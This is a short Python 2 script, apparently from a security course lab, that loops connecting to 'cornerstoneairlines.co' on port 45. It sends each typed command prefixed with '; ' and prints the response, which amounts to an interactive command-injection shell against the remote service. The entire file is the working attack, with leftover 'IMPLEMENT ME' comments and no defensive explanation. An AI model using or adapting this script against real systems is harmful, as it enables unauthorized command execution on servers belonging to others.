import time
import socket

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd():
    # Establish socket connection



    # print(data)             # Prints data
    # data = s.recv(1024)
    while (1 > 0):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        data = s.recv(1024)       # Receives 1024 bytes from IP/Port

        cmd = "; " + raw_input("$ ") + "\n"
        if cmd == "; quit\n":
            break
        s.send(cmd)   # Send a newline \n at the end of your command

        time.sleep(2)
        data = s.recv(1024)     # Receives 1024 bytes from IP/Port
        print(data)

    print(cmd)


    # while data != "":
    #     data = s.recv(1024)

    # print("IMPLEMENT ME - 1")


if __name__ == '__main__':

    while (1 > 0):

        # print("\n" + cmd + "\n")

        execute_cmd()
    # print("IMPLEMENT ME")
